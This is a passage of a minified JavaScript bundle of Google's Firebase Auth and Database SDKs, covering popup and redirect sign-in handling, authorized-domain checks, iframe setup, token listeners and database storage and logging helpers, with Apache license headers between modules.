 */class K4{constructor(e,n,i,s,o=!1){this.auth=e,this.resolver=i,this.user=s,this.bypassAuthState=o,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(n)?n:[n]}execute(){return new Promise(async(e,n)=>{this.pendingPromise={resolve:e,reject:n};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(i){this.reject(i)}})}async onAuthEvent(e){const{urlResponse:n,sessionId:i,postBody:s,tenantId:o,error:c,type:d}=e;if(c){this.reject(c);return}const f={auth:this.auth,requestUri:n,sessionId:i,tenantId:o||void 0,postBody:s||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(d)(f))}catch(p){this.reject(p)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return zL;case"linkViaPopup":case"linkViaRedirect":return HL;case"reauthViaPopup":case"reauthViaRedirect":return FL;default:ts(this.auth,"internal-error")}}resolve(e){Fs(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){Fs(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const qL=new $d(2e3,1e4);async function GL(t,e,n){if(rr(t.app))return Promise.reject(_r(t,"operation-not-supported-in-this-environment"));const i=Tp(t);zj(t,e,Y_);const s=Q4(i,n);return new jo(i,"signInViaPopup",e,s).executeNotNull()}class jo extends K4{constructor(e,n,i,s,o){super(e,n,s,o),this.provider=i,this.authWindow=null,this.pollId=null,jo.currentPopupAction&&jo.currentPopupAction.cancel(),jo.currentPopupAction=this}async executeNotNull(){const e=await this.execute();return qe(e,this.auth,"internal-error"),e}async onExecution(){Fs(this.filter.length===1,"Popup operations only handle one event");const e=Q_();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch(n=>{this.reject(n)}),this.resolver._isIframeWebStorageSupported(this.auth,n=>{n||this.reject(_r(this.auth,"web-storage-unsupported"))}),this.pollUserCancellation()}get eventId(){var e;return((e=this.authWindow)===null||e===void 0?void 0:e.associatedEvent)||null}cancel(){this.reject(_r(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,jo.currentPopupAction=null}pollUserCancellation(){const e=()=>{var n,i;if(!((i=(n=this.authWindow)===null||n===void 0?void 0:n.window)===null||i===void 0)&&i.closed){this.pollId=window.setTimeout(()=>{this.pollId=null,this.reject(_r(this.auth,"popup-closed-by-user"))},8e3);return}this.pollId=window.setTimeout(e,qL.get())};e()}}jo.currentPopupAction=null;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const YL="pendingRedirect",Gf=new Map;class QL extends K4{constructor(e,n,i=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],n,void 0,i),this.eventId=null}async execute(){let e=Gf.get(this.auth._key());if(!e){try{const i=await KL(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(i)}catch(n){e=()=>Promise.reject(n)}Gf.set(this.auth._key(),e)}return this.bypassAuthState||Gf.set(this.auth._key(),()=>Promise.resolve(null)),e()}async onAuthEvent(e){if(e.type==="signInViaRedirect")return super.onAuthEvent(e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){const n=await this.auth._redirectUserForId(e.eventId);if(n)return this.user=n,super.onAuthEvent(e);this.resolve(null)}}async onExecution(){}cleanUp(){}}async function KL(t,e){const n=XL(e),i=$L(t);if(!await i._isAvailable())return!1;const s=await i._get(n)==="true";return await i._remove(n),s}function WL(t,e){Gf.set(t._key(),e)}function $L(t){return Ds(t._redirectPersistence)}function XL(t){return qf(YL,t.config.apiKey,t.name)}async function ZL(t,e,n=!1){if(rr(t.app))return Promise.reject(Uo(t));const i=Tp(t),s=Q4(i,e),c=await new QL(i,s,n).execute();return c&&!n&&(delete c.user._redirectEventId,await i._persistUserIfCurrent(c.user),await i._setRedirectUser(null,e)),c}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const JL=10*60*1e3;class e7{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let n=!1;return this.consumers.forEach(i=>{this.isEventForConsumer(e,i)&&(n=!0,this.sendToConsumer(e,i),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!t7(e)||(this.hasHandledPotentialRedirect=!0,n||(this.queuedRedirectEvent=e,n=!0)),n}sendToConsumer(e,n){var i;if(e.error&&!W4(e)){const s=((i=e.error.code)===null||i===void 0?void 0:i.split("auth/")[1])||"internal-error";n.onError(_r(this.auth,s))}else n.onAuthEvent(e)}isEventForConsumer(e,n){const i=n.eventId===null||!!e.eventId&&e.eventId===n.eventId;return n.filter.includes(e.type)&&i}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=JL&&this.cachedEventUids.clear(),this.cachedEventUids.has(aE(e))}saveEventToCache(e){this.cachedEventUids.add(aE(e)),this.lastProcessedEventTime=Date.now()}}function aE(t){return[t.type,t.eventId,t.sessionId,t.tenantId].filter(e=>e).join("-")}function W4({type:t,error:e}){return t==="unknown"&&(e==null?void 0:e.code)==="auth/no-auth-event"}function t7(t){switch(t.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return W4(t);default:return!1}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function n7(t,e={}){return Bc(t,"GET","/v1/projects",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const i7=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,r7=/^https?/;async function s7(t){if(t.config.emulator)return;const{authorizedDomains:e}=await n7(t);for(const n of e)try{if(a7(n))return}catch{}ts(t,"unauthorized-domain")}function a7(t){const e=J0(),{protocol:n,hostname:i}=new URL(e);if(t.startsWith("chrome-extension://")){const c=new URL(t);return c.hostname===""&&i===""?n==="chrome-extension:"&&t.replace("chrome-extension://","")===e.replace("chrome-extension://",""):n==="chrome-extension:"&&c.hostname===i}if(!r7.test(n))return!1;if(i7.test(t))return i===t;const s=t.replace(/\./g,"\\.");return new RegExp("^(.+\\."+s+"|"+s+")$","i").test(i)}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const o7=new $d(3e4,6e4);function oE(){const t=Xr().___jsl;if(t!=null&&t.H){for(const e of Object.keys(t.H))if(t.H[e].r=t.H[e].r||[],t.H[e].L=t.H[e].L||[],t.H[e].r=[...t.H[e].L],t.CP)for(let n=0;n<t.CP.length;n++)t.CP[n]=null}}function l7(t){return new Promise((e,n)=>{var i,s,o;function c(){oE(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{oE(),n(_r(t,"network-request-failed"))},timeout:o7.get()})}if(!((s=(i=Xr().gapi)===null||i===void 0?void 0:i.iframes)===null||s===void 0)&&s.Iframe)e(gapi.iframes.getContext());else if(!((o=Xr().gapi)===null||o===void 0)&&o.load)c();else{const d=mL("iframefcb");return Xr()[d]=()=>{gapi.load?c():n(_r(t,"network-request-failed"))},hL(`${fL()}?onload=${d}`).catch(f=>n(f))}}).catch(e=>{throw Yf=null,e})}let Yf=null;function c7(t){return Yf=Yf||l7(t),Yf}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const u7=new $d(5e3,15e3),d7="__/auth/iframe",h7="emulator/auth/iframe",f7={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},m7=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function p7(t){const e=t.config;qe(e.authDomain,t,"auth-domain-config-required");const n=e.emulator?z_(e,h7):`https://${t.config.authDomain}/${d7}`,i={apiKey:e.apiKey,appName:t.name,v:tl},s=m7.get(t.config.apiHost);s&&(i.eid=s);const o=t._getFrameworks();return o.length&&(i.fw=o.join(",")),`${n}?${Pc(i).slice(1)}`}async function g7(t){const e=await c7(t),n=Xr().gapi;return qe(n,t,"internal-error"),e.open({where:document.body,url:p7(t),messageHandlersFilter:n.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:f7,dontclear:!0},i=>new Promise(async(s,o)=>{await i.restyle({setHideOnLeave:!1});const c=_r(t,"network-request-failed"),d=Xr().setTimeout(()=>{o(c)},u7.get());function f(){Xr().clearTimeout(d),s(i)}i.ping(f).then(f,()=>{o(c)})}))}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const y7={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},v7=500,_7=600,w7="_blank",b7="http://localhost";class lE{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}}function x7(t,e,n,i=v7,s=_7){const o=Math.max((window.screen.availHeight-s)/2,0).toString(),c=Math.max((window.screen.availWidth-i)/2,0).toString();let d="";const f=Object.assign(Object.assign({},y7),{width:i.toString(),height:s.toString(),top:o,left:c}),p=Xn().toLowerCase();n&&(d=R4(p)?w7:n),S4(p)&&(e=e||b7,f.scrollbars="yes");const v=Object.entries(f).reduce((w,[E,C])=>`${w}${E}=${C},`,"");if(rL(p)&&d!=="_self")return A7(e||"",d),new lE(null);const b=window.open(e||"",d,v);qe(b,t,"popup-blocked");try{b.focus()}catch{}return new lE(b)}function A7(t,e){const n=document.createElement("a");n.href=t,n.target=e;const i=document.createEvent("MouseEvent");i.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),n.dispatchEvent(i)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const E7="__/auth/handler",T7="emulator/auth/handler",C7=encodeURIComponent("fac");async function cE(t,e,n,i,s,o){qe(t.config.authDomain,t,"auth-domain-config-required"),qe(t.config.apiKey,t,"invalid-api-key");const c={apiKey:t.config.apiKey,appName:t.name,authType:n,redirectUrl:i,v:tl,eventId:s};if(e instanceof Y_){e.setDefaultLanguage(t.languageCode),c.providerId=e.providerId||"",R0(e.getCustomParameters())||(c.customParameters=JSON.stringify(e.getCustomParameters()));for(const[v,b]of Object.entries({}))c[v]=b}if(e instanceof Xd){const v=e.getScopes().filter(b=>b!=="");v.length>0&&(c.scopes=v.join(","))}t.tenantId&&(c.tid=t.tenantId);const d=c;for(const v of Object.keys(d))d[v]===void 0&&delete d[v];const f=await t._getAppCheckToken(),p=f?`#${C7}=${encodeURIComponent(f)}`:"";return`${S7(t)}?${Pc(d).slice(1)}${p}`}function S7({config:t}){return t.emulator?z_(t,T7):`https://${t.authDomain}/${E7}`}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const d0="webStorageSupport";class N7{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=F4,this._completeRedirectFn=ZL,this._overrideRedirectResult=WL}async _openPopup(e,n,i,s){var o;Fs((o=this.eventManagers[e._key()])===null||o===void 0?void 0:o.manager,"_initialize() not called before _openPopup()");const c=await cE(e,n,i,J0(),s);return x7(e,c,Q_())}async _openRedirect(e,n,i,s){await this._originValidation(e);const o=await cE(e,n,i,J0(),s);return kL(o),new Promise(()=>{})}_initialize(e){const n=e._key();if(this.eventManagers[n]){const{manager:s,promise:o}=this.eventManagers[n];return s?Promise.resolve(s):(Fs(o,"If manager is not set, promise should be"),o)}const i=this.initAndGetManager(e);return this.eventManagers[n]={promise:i},i.catch(()=>{delete this.eventManagers[n]}),i}async initAndGetManager(e){const n=await g7(e),i=new e7(e);return n.register("authEvent",s=>(qe(s==null?void 0:s.authEvent,e,"invalid-auth-event"),{status:i.onEvent(s.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:i},this.iframes[e._key()]=n,i}_isIframeWebStorageSupported(e,n){this.iframes[e._key()].send(d0,{type:d0},s=>{var o;const c=(o=s==null?void 0:s[0])===null||o===void 0?void 0:o[d0];c!==void 0&&n(!!c),ts(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){const n=e._key();return this.originValidationPromises[n]||(this.originValidationPromises[n]=s7(e)),this.originValidationPromises[n]}get _shouldInitProactively(){return O4()||N4()||q_()}}const R7=N7;var uE="@firebase/auth",dE="1.10.6";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class I7{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){var e;return this.assertAuthConfigured(),((e=this.auth.currentUser)===null||e===void 0?void 0:e.uid)||null}async getToken(e){return this.assertAuthConfigured(),await this.auth._initializationPromise,this.auth.currentUser?{accessToken:await this.auth.currentUser.getIdToken(e)}:null}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;const n=this.auth.onIdTokenChanged(i=>{e((i==null?void 0:i.stsTokenManager.accessToken)||null)});this.internalListeners.set(e,n),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();const n=this.internalListeners.get(e);n&&(this.internalListeners.delete(e),n(),this.updateProactiveRefresh())}assertAuthConfigured(){qe(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function k7(t){switch(t){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";case"WebExtension":return"web-extension";default:return}}function D7(t){Fo(new za("auth",(e,{options:n})=>{const i=e.getProvider("app").getImmediate(),s=e.getProvider("heartbeat"),o=e.getProvider("app-check-internal"),{apiKey:c,authDomain:d}=i.options;qe(c&&!c.includes(":"),"invalid-api-key",{appName:i.name});const f={apiKey:c,authDomain:d,clientPlatform:t,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:P4(t)},p=new uL(i,s,o,f);return gL(p,n),p},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,n,i)=>{e.getProvider("auth-internal").initialize()})),Fo(new za("auth-internal",e=>{const n=Tp(e.getProvider("auth").getImmediate());return(i=>new I7(i))(n)},"PRIVATE").setInstantiationMode("EXPLICIT")),Kr(uE,dE,k7(t)),Kr(uE,dE,"esm2017")}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const M7=5*60,O7=MC("authIdTokenMaxAge")||M7;let hE=null;const P7=t=>async e=>{const n=e&&await e.getIdTokenResult(),i=n&&(new Date().getTime()-Date.parse(n.issuedAtTime))/1e3;if(i&&i>O7)return;const s=n==null?void 0:n.token;hE!==s&&(hE=s,await fetch(t,{method:s?"POST":"DELETE",headers:s?{Authorization:`Bearer ${s}`}:{}}))};function j7(t=Jv()){const e=rp(t,"auth");if(e.isInitialized())return e.getImmediate();const n=pL(t,{popupRedirectResolver:R7,persistence:[BL,NL,F4]}),i=MC("authTokenSyncURL");if(i&&typeof isSecureContext=="boolean"&&isSecureContext){const o=new URL(i,location.origin);if(location.origin===o.origin){const c=P7(o.toString());TL(n,c,()=>c(n.currentUser)),EL(n,d=>c(d))}}const s=IC("auth");return s&&yL(n,`http://${s}`),n}function L7(){var t,e;return(e=(t=document.getElementsByTagName("head"))===null||t===void 0?void 0:t[0])!==null&&e!==void 0?e:document}dL({loadJS(t){return new Promise((e,n)=>{const i=document.createElement("script");i.setAttribute("src",t),i.onload=e,i.onerror=s=>{const o=_r("internal-error");o.customData=s,n(o)},i.type="text/javascript",i.charset="UTF-8",L7().appendChild(i)})},gapiScript:"https://apis.google.com/js/api.js",recaptchaV2Script:"https://www.google.com/recaptcha/api.js",recaptchaEnterpriseScript:"https://www.google.com/recaptcha/enterprise.js?render="});D7("Browser");var fE={};const mE="@firebase/database",pE="1.0.19";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let $4="";function V7(t){$4=t}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class U7{constructor(e){this.domStorage_=e,this.prefix_="firebase:"}set(e,n){n==null?this.domStorage_.removeItem(this.prefixedName_(e)):this.domStorage_.setItem(this.prefixedName_(e),Nn(n))}get(e){const n=this.domStorage_.getItem(this.prefixedName_(e));return n==null?null:yd(n)}remove(e){this.domStorage_.removeItem(this.prefixedName_(e))}prefixedName_(e){return this.prefix_+e}toString(){return this.domStorage_.toString()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class B7{constructor(){this.cache_={},this.isInMemoryStorage=!0}set(e,n){n==null?delete this.cache_[e]:this.cache_[e]=n}get(e){return ns(this.cache_,e)?this.cache_[e]:null}remove(e){delete this.cache_[e]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const X4=function(t){try{if(typeof window<"u"&&typeof window[t]<"u"){const e=window[t];return e.setItem("firebase:sentinel","cache"),e.removeItem("firebase:sentinel"),new U7(e)}}catch{}return new B7},Lo=X4("localStorage"),z7=X4("sessionStorage");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ac=new ip("@firebase/database"),F7=function(){let t=1;return function(){return t++}}(),Z4=function(t){const e=yO(t),n=new fO;n.update(e);const i=n.digest();return Kv.encodeByteArray(i)},Jd=function(...t){let e="";for(let n=0;n<t.length;n++){const i=t[n];Array.isArray(i)||i&&typeof i=="object"&&typeof i.length=="number"?e+=Jd.apply(null,i):typeof i=="object"?e+=Nn(i):e+=i,e+=" "}return e};let ud=null,gE=!0;const H7=function(t,e){ye(!0,"Can't turn on custom loggers persistently."),ac.logLevel=ot.VERBOSE,ud=ac.log.bind(ac)},Vn=function(...t){if(gE===!0&&(gE=!1,ud===null&&z7.get("logging_enabled")===!0&&H7()),ud){const e=Jd.apply(null,t);ud(e)}},eh=function(t){return function(...e){Vn(t,...e)}},nv=function(...t){const e="FIREBASE INTERNAL ERROR: "+Jd(...t);ac.error(e)},Hs=function(...t){const e=`FIREBASE FATAL ERROR: ${Jd(...t)}`;throw ac.error(e),new Error(e)},oi=function(...t){const e="FIREBASE WARNING: "+Jd(...t);ac.warn(e)},q7=function(){typeof window<"u"&&window.location&&window.location.protocol&&window.location.protocol.indexOf("https:")!==-1&&oi("Insecure Firebase access from a secure page. Please use https in calls to new Firebase().")},W_=function(t){return typeof t=="number"&&(t!==t||t===Number.POSITIVE_INFINITY||t===Number.NEGATIVE_INFINITY)},G7=function(t){if(document.readyState==="complete")t();else{let e=!1;const n=function(){if(!document.body){setTimeout(n,Math.floor(10));return}e||(e=!0,t())};document.addEventListener?(document.addEventListener("DOMContentLoaded",n,!1),window.addEventListener("load",n,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",()=>{document.readyState==="complete"&&n()}),window.attachEvent("onload",n))}},Ac="[MIN_NAME]",Yo="[MAX_NAME]",rl=function(t,e){if(t===e)return 0;if(t===Ac||e===Yo)return-1;if(e===Ac||t===Yo)return 1;{const n=yE(t),i=yE(e);return n!==null?i!==null?n-i===0?t.length-e.length:n-i:-1:i!==null?1:t<e?-1:1}},Y7=function(t,e){return t===e?0:t<e?-1:1},Ku=function(t,e){if(e&&t in e)return e[t];throw new Error("Missing required key ("+t+") in object: "+Nn(e))},$_=function(t){if(typeof t!="object"||t===null)return Nn(t);const e=[];for(const i in t)e.push(i);e.sort();let n="{";for(let i=0;i<e.length;i++)i!==0&&(n+=","),n+=Nn(e[i]),n+=":",n+=$_(t[e[i]]);return n+="}",n},J4=function(t,e){const n=t.length;if(n<=e)return[t];const i=[];for(let s=0;s<n;s+=e)s+e>n?i.push(t.substring(s,n)):i.push(t.substring(s,s+e));return i};function zn(t,e){for(const n in t)t.hasOwnProperty(n)&&e(n,t[n])}const eN=function(t){ye(!W_(t),"Invalid JSON number");const e=11,n=52,i=(1<<e-1)-1;let s,o,c,d,f;t===0?(o=0,c=0,s=1/t===-1/0?1:0):(s=t<0,t=Math.abs(t),t>=Math.pow(2,1-i)?(d=Math.min(Math.floor(Math.log(t)/Math.LN2),i),o=d+i,c=Math.round(t*Math.pow(2,n-d)-Math.pow(2,n))):(o=0,c=Math.round(t/Math.pow(2,1-i-n))));const p=[];for(f=n;f;f-=1)p.push(c%2?1:0),c=Math.floor(c/2);for(f=e;f;f-=1)p.push(o%2?1:0),o=Math.floor(o/2);p.push(s?1:0),p.reverse();const v=p.join("");let b="";for(f=0;f<64;f+=8){let w=parseInt(v.substr(f,8),2).toString(16);w.length===1&&(w="0"+w),b=b+w}return b.toLowerCase()},Q7=function(){return!!(typeof window=="object"&&window.chrome&&window.chrome.extension&&!/^chrome/.test(window.location.href))},K7=function(){return typeof Windows=="object"&&typeof Windows.UI=="object"};function W7(t,e){let n="Unknown Error";t==="too_big"?n="The data requested exceeds the maximum size that can be accessed with a single request.":t==="permission_denied"?n="Client doesn't have permission to access the desired data.":t==="unavailable"&&(n="The service is unavailable");const i=new Error(t+" at "+e._path.toString()+": "+n);return i.code=t.toUpperCase(),i}const $7=new RegExp("^-?(0*)\\d{1,10}$"),X7=-2147483648,Z7=2147483647,yE=function(t){if($7.test(t)){const e=Number(t);if(e>=X7&&e<=Z7)return e}return null},zc=function(t){try{t()}catch(e){setTimeout(()=>{const n=e.stack||"";throw oi("Exception was thrown by user callback.",n),e},Math.floor(0))}},J7=function(){return(typeof window=="object"&&window.navigator&&window.navigator.userAgent||"").search(/googlebot|google webmaster tools|bingbot|yahoo! slurp|baiduspider|yandexbot|duckduckbot/i)>=0},dd=function(t,e){const n=setTimeout(t,e);return typeof n=="number"&&typeof Deno<"u"&&Deno.unrefTimer?Deno.unrefTimer(n):typeof n=="object"&&n.unref&&n.unref(),n};/**
 * @license
 * Copyright 2021 Google LLC
 *
